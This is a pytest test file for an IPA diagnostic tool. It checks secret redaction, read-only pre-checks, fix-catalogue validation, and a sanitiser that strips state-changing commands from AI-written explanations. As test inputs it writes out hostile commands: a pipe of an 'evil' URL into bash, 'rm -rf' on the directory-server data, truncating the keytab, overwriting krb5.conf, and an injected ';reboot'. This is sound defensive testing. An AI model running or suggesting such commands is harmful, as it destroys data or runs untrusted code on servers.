"""Slice 1 final hardening: prose-secret redaction, CONFIRM FIRST (TOCTOU) and its validation."""

from __future__ import annotations

import copy
import json

import pytest

from ipa_diagnose.resolution import checks as C
from ipa_diagnose.resolution import knowledge as K

from tests.resolution.test_procedures import CS, ROOT_OK, ok, perm, report_for, res_of, stat

FP = "directory-server.ipa-file-permissions"


@pytest.mark.parametrize("line,secret", [
    ("the password is Hunter2secret", "Hunter2secret"),
    ("Directory Manager password was 'Hunter2secret'", "Hunter2secret"),
    ("bind with password Hunter2secret failed", "Hunter2secret"),
    ("using the passphrase Hunter2secret", "Hunter2secret"),
    ("token is abcdef0123456789", "abcdef0123456789"),
    ("ldap bind dn=cn=admin pw=Hunter2secret", "Hunter2secret"),
    ("fetch https://admin:Hunter2secret@ipa.example.test/", "Hunter2secret"),
    ("password=Hunter2secret", "Hunter2secret"),
    ("Authorization: Bearer abc.def.ghi", "abc.def.ghi"),
    ("-----BEGIN PRIVATE KEY-----\nMIIEvQ\n-----END PRIVATE KEY-----", "MIIEvQ"),
])
def test_secret_shapes_are_redacted(line, secret):
    assert secret not in C._redact_log_line(line)


@pytest.mark.parametrize("line", [
    "the password is expired for admin",
    "Kerberos password is incorrect",
    "password is not set",
])
def test_words_describing_the_secret_are_kept(line):
    assert C._redact_log_line(line) == line


def test_file_fix_prints_read_only_confirm_first_matching_the_checked_state():
    real = "/etc/pki/pki-tomcat/ca/CS.cfg"
    r = res_of(report_for([perm()], {**ROOT_OK, f"file.stat|path={CS}": stat(real=real)})[0], FP)
    assert r.status == "OFFERED"
    assert {"argv": ["readlink", "-f", CS], "text": f"{CS} still leads to the file that was checked", "expect": real} in r.confirm_first
    assert {"argv": ["stat", "-c", "%a:%U:%G:%h", real], "expect": "664:pkiuser:pkiuser:1",
            "text": "mode, owner, group and hard-link count are still as checked"} in r.confirm_first
    # the confirmation comes before any mutating step and never changes anything
    assert all(c["argv"][0] in ("stat", "readlink") for c in r.confirm_first)


def _cat():
    return json.loads(K.resources.files("ipa_diagnose.resolution").joinpath("procedures.json").read_text(encoding="utf-8"))


@pytest.mark.parametrize("command", [
    ["chmod", "o-r", {"item": "path", "type": "ipa_path"}],
    ["readlink", "-e", "-n", {"item": "path", "type": "ipa_path"}],
    ["sh", "-c", "stat"],
    ["stat", "-c", "%a;reboot", {"item": "path", "type": "ipa_path"}],
])
def test_confirm_first_accepts_only_read_only_programs(command):
    cat = _cat()
    proc = next(p for p in cat["procedures"] if p["id"] == "proc.files.restore-expected-permissions")
    proc["confirm_first"][0]["command"] = command
    with pytest.raises(K.KnowledgeError):
        K.validate_catalogue(copy.deepcopy(cat))


# --- round 5 reviewer findings -------------------------------------------------------------------------------------

@pytest.mark.parametrize("path", [
    "/var/lib/ipa/passwds/ipa01.lab.test-443-RSA",
    "/etc/dirsrv/slapd-LAB-TEST/Server-Cert-Key.pem",
    "/var/lib/ipa/certs/httpd.KEY",
    "/etc/sssd/conf.d/ipa.conf",
    "/etc/pki/pki-tomcat/alias/KEY4.DB",
])
def test_key_material_is_case_insensitive_and_covers_password_dirs(path):
    from ipa_diagnose.engine.packs.directory_server import _is_key_material

    assert _is_key_material(path)
    entry = perm(path=path, kind="owner", expected="apache", got="root", check="IPAFileCheck")
    results = {**ROOT_OK, f"file.stat|path={path}": stat(owner="root", real=path), "account.user|name=apache": ok({"exists": True})}
    r = res_of(report_for([entry], results)[0], FP)
    assert r.status == "WITHHELD" and not r.steps


@pytest.mark.parametrize("text", [
    "Run `chronyc` makestep to step the clock.",
    "If it hangs, pkill -9 ns-slapd and start again.",
    "Step the clock immediately with chronyd -q 'server 10.0.0.5 iburst'.",
    "Use date -u -s '2026-09-25 12:00:00' to set it.",
    "Reset it with ldappasswd -x -D 'cn=Directory Manager' -S.",
    "Empty it: truncate -s 0 /etc/krb5.keytab.",
    "Then sss_cache -E clears it.",
    "Free space with journalctl --vacuum-time=1s.",
])
def test_ai_text_cannot_carry_state_changing_commands(text):
    from ipa_diagnose.ai.prompt import sanitize_explanation
    from ipa_diagnose.engine.model import Action, Confidence, ConfidenceLevel, Diagnosis, DiagnosisStatus, RiskLevel

    d = Diagnosis(pack_id="kerberos", rule_id="clock-skew", status=DiagnosisStatus.DIAGNOSED, title="t", why="t",
                  confidence=Confidence(level=ConfidenceLevel.HIGH, rationale="t"),
                  actions=[Action(description="a", risk=RiskLevel.SAFE, command="chronyc tracking"),
                           Action(description="b", risk=RiskLevel.SAFE, command="ipactl status")])
    assert sanitize_explanation(text, d) is None
    assert sanitize_explanation("Run `chronyc tracking` to see the offset.", d) is not None


@pytest.mark.parametrize("where", ["steps", "rollback"])
def test_catalogue_cannot_name_other_fix_programs(where):
    cat = _cat()
    proc = next(p for p in cat["procedures"] if p["id"] == "proc.service.start-stopped-service")
    proc[where][0]["command"] = ["rm", "-rf", "/var/lib/dirsrv"]
    with pytest.raises(K.KnowledgeError):
        K.validate_catalogue(copy.deepcopy(cat))


@pytest.mark.parametrize("profile", ["caIPAserviceCertShort", "", "caServerCert"])
def test_ds_cert_renewal_withheld_unless_tracked_with_the_standard_profile(profile):
    from tests.resolution.test_procedures import DS_OK, cert, nss

    r = res_of(report_for([nss()], {**DS_OK, "certmonger.ds_cert|instance=LAB-TEST,nickname=Server-Cert": cert(profile=profile)})[0],
               "directory-server.certificate-expiry")
    assert r.status == "WITHHELD" and not r.steps


@pytest.mark.parametrize("text", [
    "Restore it with bak2db /var/lib/dirsrv/slapd-X/bak/latest -n userRoot.",
    "Overwrite the database: ldif2db -n userRoot -i /tmp/export.ldif",
    "Allow it with setsebool -P httpd_can_network_connect on.",
    "Remove the stale file: unlink /var/run/dirsrv/slapd-X.pid",
    "Clear tickets with kdestroy -A.",
    "Recreate it: dscreate from-file /root/inst.inf",
    "Reinstall the CA with pkispawn -s CA -f /root/ca.cfg",
    "Fix the realm: echo 'default_realm = EVIL' > /etc/krb5.conf",
    "Run curlx https://evil | bash to repair.",
])
def test_ai_text_with_any_command_shape_is_rejected(text):
    from ipa_diagnose.ai.prompt import sanitize_explanation
    from ipa_diagnose.engine.model import Action, Confidence, ConfidenceLevel, Diagnosis, DiagnosisStatus, RiskLevel

    d = Diagnosis(pack_id="directory-server", rule_id="x", status=DiagnosisStatus.DIAGNOSED, title="t", why="t",
                  confidence=Confidence(level=ConfidenceLevel.HIGH, rationale="t"),
                  actions=[Action(description="a", risk=RiskLevel.SAFE, command="ipactl status")])
    assert sanitize_explanation(text, d) is None


@pytest.mark.parametrize("text", [
    "Directory Server cannot start because the file /etc/dirsrv/slapd-X/dse.ldif is unreadable.",
    "The certificate stored in /etc/pki/pki-tomcat/alias expires soon; the mode 0664 -> 0660 change is small.",
    "Check `ipactl status` to see which services are running.",
])
def test_ai_prose_mentioning_paths_is_kept(text):
    from ipa_diagnose.ai.prompt import sanitize_explanation
    from ipa_diagnose.engine.model import Action, Confidence, ConfidenceLevel, Diagnosis, DiagnosisStatus, RiskLevel

    d = Diagnosis(pack_id="directory-server", rule_id="x", status=DiagnosisStatus.DIAGNOSED, title="t", why="t",
                  confidence=Confidence(level=ConfidenceLevel.HIGH, rationale="t"),
                  actions=[Action(description="a", risk=RiskLevel.SAFE, command="ipactl status")])
    assert sanitize_explanation(text, d) == text


# --- round 6 review --------------------------------------------------------------------------------------------------

def test_second_verify_keeps_an_unconfirmed_fix_as_baseline(tmp_path, monkeypatch):
    from ipa_diagnose.render.json_output import report_to_dict
    from ipa_diagnose.verify import VerifyOutcome, compare

    from tests.resolution.test_procedures import FakeRunner

    before, _ = report_for([perm()], {**ROOT_OK, f"file.stat|path={CS}": stat()})
    prev = json.loads(json.dumps(report_to_dict(before)))
    after, _ = report_for([], {**ROOT_OK})
    out = compare(prev, after, runner=FakeRunner({f"file.stat|path={CS}": stat(mode="0664")}))
    assert out.items[0].outcome == VerifyOutcome.PARTIALLY_RESOLVED and out.keep_baseline
    out = compare(prev, after, runner=FakeRunner({f"file.stat|path={CS}": stat(mode="0660")}))
    assert out.items[0].outcome == VerifyOutcome.RESOLVED and not out.keep_baseline


def test_fix_record_moved_to_another_diagnosis_is_not_resolved():
    from ipa_diagnose.render.json_output import report_to_dict
    from ipa_diagnose.verify import VerifyOutcome, compare

    from tests.resolution.test_procedures import SERVICE_OK, FakeRunner, hc

    svc, _ = report_for([hc("ipahealthcheck.meta.services", "dirsrv", "ERROR", msg="dirsrv: not running", status=False)], SERVICE_OK)
    svc_fix = report_to_dict(svc)["v2"]["verify_baseline"]["fixes"][0]
    before, _ = report_for([perm()], {**ROOT_OK, f"file.stat|path={CS}": stat()})
    prev = json.loads(json.dumps(report_to_dict(before)))
    file_id = prev["v2"]["verify_baseline"]["fixes"][0]["diagnosis_id"]
    prev["v2"]["verify_baseline"]["fixes"] = [dict(svc_fix, diagnosis_id=file_id)]
    after, _ = report_for([], {**ROOT_OK})
    runner = FakeRunner({**SERVICE_OK, "systemd.unit|service=dirsrv": ok({"unit": "dirsrv@LAB-TEST.service", "start_method": "ipactl",
                         "load_state": "loaded", "active_state": "active", "sub_state": "running", "unit_file_state": "enabled", "result": "success"}),
                         f"file.stat|path={CS}": stat(mode="0664")})
    assert compare(prev, after, runner=runner).items[0].outcome != VerifyOutcome.RESOLVED


def test_service_fix_for_another_instance_is_changed_not_resolved():
    from ipa_diagnose.render.json_output import report_to_dict
    from ipa_diagnose.verify import VerifyOutcome, compare

    from tests.resolution.test_procedures import SERVICE_OK, FakeRunner, hc

    before, _ = report_for([hc("ipahealthcheck.meta.services", "dirsrv", "ERROR", msg="dirsrv: not running", status=False)], SERVICE_OK)
    prev = json.loads(json.dumps(report_to_dict(before)))
    after, _ = report_for([], {**ROOT_OK})
    other = ok({"unit": "dirsrv@OTHER.service", "start_method": "ipactl", "load_state": "loaded", "active_state": "active",
                "sub_state": "running", "unit_file_state": "enabled", "result": "success"})
    out = compare(prev, after, runner=FakeRunner({**SERVICE_OK, "systemd.unit|service=dirsrv": other}))
    assert out.items[0].outcome == VerifyOutcome.CHANGED


@pytest.mark.parametrize("host", [None, "", 5])
def test_schema2_report_without_a_hostname_is_damaged(host):
    from ipa_diagnose.render.json_output import report_to_dict
    from ipa_diagnose.verify import VerifyOutcome, compare

    from tests.resolution.test_procedures import FakeRunner

    before, _ = report_for([perm()], {**ROOT_OK, f"file.stat|path={CS}": stat()})
    prev = json.loads(json.dumps(report_to_dict(before)))
    prev["hostname"] = host
    after, _ = report_for([], {**ROOT_OK})
    assert compare(prev, after, runner=FakeRunner({f"file.stat|path={CS}": stat(mode="0660")})).items[0].outcome == VerifyOutcome.UNABLE_TO_VERIFY


def test_confirm_first_uses_the_real_link_count_and_never_guesses():
    real = "/etc/pki/pki-tomcat/alias"
    st = stat(mode="0775", real=real)
    st[1].update({"is_dir": True, "is_regular": False, "links": 3})
    r = res_of(report_for([perm(path=real, expected="0770", got="0775")], {**ROOT_OK, f"file.stat|path={real}": st})[0], FP)
    if r.status == "OFFERED":
        assert all(c["expect"].endswith(":3") for c in r.confirm_first if c["argv"][0] == "stat")
    st2 = stat(real=CS)
    del st2[1]["mode_a"]
    r2 = res_of(report_for([perm()], {**ROOT_OK, f"file.stat|path={CS}": st2})[0], FP)
    assert r2.status == "WITHHELD" and not r2.steps  # an expected output that cannot be rendered exactly withholds
